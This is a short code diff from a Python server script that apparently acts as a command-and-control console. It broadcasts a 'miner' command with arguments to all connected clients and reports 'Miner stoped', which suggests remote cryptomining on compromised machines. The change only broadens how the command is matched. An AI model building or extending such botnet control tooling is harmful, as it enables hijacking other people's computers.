@@ -172,7 +172,7 @@ def server():
 
                             print("\033[96m[*]\033[0m Miner stoped\n")
 
-                    elif console == "miner":
+                    elif console.startswith("miner"):
                         if len(console.split()) == 4:
                             for client in clients:
                                 client.sendall(console.encode())
